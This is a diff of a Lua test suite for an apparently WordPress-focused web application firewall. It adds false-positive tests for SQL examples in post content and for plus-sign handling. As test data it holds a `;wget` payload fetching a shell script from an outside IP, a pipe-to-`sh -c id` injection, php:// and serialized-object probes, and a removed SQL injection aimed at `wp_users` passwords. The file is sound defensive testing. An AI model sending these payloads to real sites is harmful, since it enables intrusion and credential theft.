@@ -61,8 +61,6 @@ do
   check(r.reason:find("^WAF_PHP_WRAPPER") and r.action == "block", "GET, 2 KB query pad, php:// → 305 (" .. show(r) .. ")")
   r = run{ method = "GET", args = "pad=" .. PAD .. '&d=O:8:"stdClass":1:{s:1:"a";s:1:"b";}' }
   check(r.ids:find(",329,", 1, true), "GET, 2 KB query pad, O:8:… → 329 (" .. show(r) .. ")")
-  r = run{ ct = "application/json", body = '{"id":"1\\tunion\\tselect user_pass from wp_users"}' }
-  check(r.reason:find("^WAF_SQLI"), "JSON \\t between SQL words decoded → SQLi (" .. show(r) .. ")")
   r = run{ method = "GET", args = "x=1;wget+http://198.51.100.4/x.sh" }
   check(r.ids:find(",320,", 1, true) and r.action == "block", "GET ;wget+ → 320 block (" .. show(r) .. ")")
   r = run{ method = "GET", args = "a=x|sh+-c+id" }
@@ -91,6 +89,12 @@ do
     -- Gutenberg serialises block attributes with \u0027 / \u002d\u002d, which
     -- reach a REST JSON body as \\u0027: the text, never a quote or `--`.
     { ct = "application/json", body = '{"content":"<!-- wp:x {\\"t\\":\\"it\\\\u0027s \\\\u002d\\\\u002d 1 OR 2\\"} /-->"}' },
+    -- The block editor saves a post's newlines as \n: a multi-line SQL example
+    -- in a code block is not an injection (it would be a 301 block + autoblock).
+    { ct = "application/json", uri = "/wp-json/wp/v2/posts/12",
+      body = '{"content":"<code>SELECT id FROM t WHERE id = 1\\nUNION\\nSELECT 2;<\\/code>"}' },
+    { ct = "application/json", uri = "/wp-json/wp/v2/posts/12",
+      body = '{"content":"<code>SELECT id, name\\nFROM wp_users\\nWHERE id = 1\\nOR 1=1;<\\/code>"}' },
     -- An office document (vnd.openxmlformats-…) is a zip: the 2 KB budget, not XML's.
     { ct = "application/vnd.openxmlformats-officedocument.wordprocessingml.document", body = "PK\3\4" .. ("x"):rep(100) },
   }
@@ -98,6 +102,16 @@ do
     local r = run(t)
     check(not r.hit, "legit request " .. i .. " stays clean (" .. show(r) .. ")")
   end
+end
+
+-- A `+` in the path, and a %2B in the query, are a literal plus to PHP: rule
+-- 320 reads only the query's raw `+` as a space. (`;wget` itself is rule 312's
+-- challenge tell, on main too.)
+do
+  local r = run{ method = "GET", uri = "/tag/c|sh+tips" }
+  check(not r.ids:find(",320,", 1, true), "a + in the path is not a space for 320 (" .. show(r) .. ")")
+  r = run{ method = "GET", args = "q=a;wget%2Bfoo" }
+  check(not r.ids:find(",320,", 1, true), "a %2B in the query is not a space for 320 (" .. show(r) .. ")")
 end
 
 -- ── Helpers ─────────────────────────────────────────────────────────────────
@@ -125,7 +139,8 @@ do
   check(bb({ ["content-type"] = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" }) ==
         bb({ ["content-type"] = "application/octet-stream" }), "an office document keeps the 2 KB budget")
   check(j('a\\\\u0027b') == 'a\\\\u0027b', "an escaped backslash is one unit: \\\\u0027 stays text")
-  check(j('a\\tb\\nc') == "a\tb\nc", "\\t / \\n decoded")
+  check(j('a\\tb\\nc') == 'a\\tb\\nc', "\\t / \\n kept as written (a post's newlines)")
+  check(j('a\\u000ab\\u0009c\\u007f') == 'a\\u000ab\\u0009c\\u007f', "control \\u escapes kept as written")
   check(j('a\\U0027b') == 'a\\U0027b', "only a lowercase \\u is an escape")
 end
 
